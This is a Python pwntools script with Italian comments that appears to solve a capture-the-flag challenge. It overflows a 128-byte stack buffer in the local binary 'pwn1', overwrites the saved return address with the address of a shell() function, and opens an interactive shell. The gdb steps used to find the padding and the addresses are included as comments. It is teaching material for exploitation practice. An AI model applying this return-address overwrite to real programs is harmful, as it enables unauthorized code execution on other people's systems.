from pwn import *

#   Lo scopo della challenge è di sovrascrivere l'indirizzo di ritorno del main
#   con quello della chiamata della funzione void shell()-
#   L'indirizzo di ritorno si trova dopo il buffer[128] in memoria e del padding

#gdb pwn1
#disassemble main

#   Trovo indirizzo per breakpoint, in questo caso quello di leave

#break *0xFFFFFFF
#run

#   Vuole un input che verrà messo in un buffer[128].
#   Inseriamo 128*"A" e vediamo la memoria

#x/100x %sp

#   Vediamo tanti blocchi di "41" ovvero "A" in ottale. Poi del paddding e poi l'indirizzo di ritorno del main
#   Per scoprire padding e indirizzo di ritorno del main da sovrascrivere
#info frame
#               Stack level 0, frame at 0xffffcd50:
#                eip = 0x8048523 in main; saved eip = 0xf7dddda9
#                Arglist at 0xffffcd48, args: 
#                Locals at 0xffffcd48, Previous frame's sp is 0xffffcd50
#                Saved registers:
#                 ebp at 0xffffcd48, eip at 0xffffcd4c

#   saved eip = 0xf7dddda9 è l'indirizzo di ritorno del main
#   Scopro che in questo caso ho 12byte di padding



#---------------------------------

#   Nel frattempo devo trovare l'indirizzo di void shell()

#disassembly shell

#   Trovo l'indirizzo 0x080484ad (in questo caso). Usiamo python per formattarlo

print(p32(0x080484ad))
inp = b"A"*128 + b"X"*12 + bytes([0xad, 0x84, 0x04, 0x08])
print(inp)

#   Uso pwntools per mandare l'input craftato

with process("pwn1") as p:
    print(p.recvuntil("Tell me your name: ").decode())
    print(p.sendline(inp))
    p.interactive()